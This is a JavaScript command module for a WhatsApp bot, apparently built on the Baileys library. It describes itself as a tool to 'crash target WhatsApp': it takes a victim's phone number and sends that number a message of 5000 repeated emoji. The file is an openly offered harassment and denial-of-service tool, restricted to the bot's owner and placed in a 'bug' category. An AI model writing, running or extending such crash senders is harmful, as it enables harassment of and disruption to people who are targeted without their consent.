import { isOwner, sendError } from '../lib/utils.js';

let cooldownErnest = 0;

export default {
    name: 'ernest-crasher',
    aliases: [],
    description: 'Sends massive messages to crash target WhatsApp (owner only)',
    isPremium: true,
    groupOnly: false,
    privateOnly: true,
    adminOnly: true,
    category: 'bug',
    async execute(sock, message, args) {
        const from = message.key.remoteJid;
        const sender = message.key.participant || from;

        if (!isOwner(sender)) 
            return await sendError(sock, from, 'Only owners can use this command.');

        const currentTime = Date.now();
        if (currentTime - cooldownErnest < 5000) 
            return await sendError(sock, from, `Please wait before using this command again.`);

        const phoneNumber = args[0]?.replace(/\D/g, '');
        if (!phoneNumber || phoneNumber.length < 10) 
            return await sendError(sock, from, `Provide a valid phone number.`);

        const targetJid = `${phoneNumber}@s.whatsapp.net`;

        try {
            const crashText = '💥'.repeat(5000);
            await sock.sendMessage(targetJid, { text: crashText });
            await sock.sendMessage(from, { text: `Crasher sent to ${phoneNumber} ✅` });
            cooldownErnest = currentTime;
        } catch (error) {
            await sendError(sock, from, 'Crasher send failed.');
        }
    }
};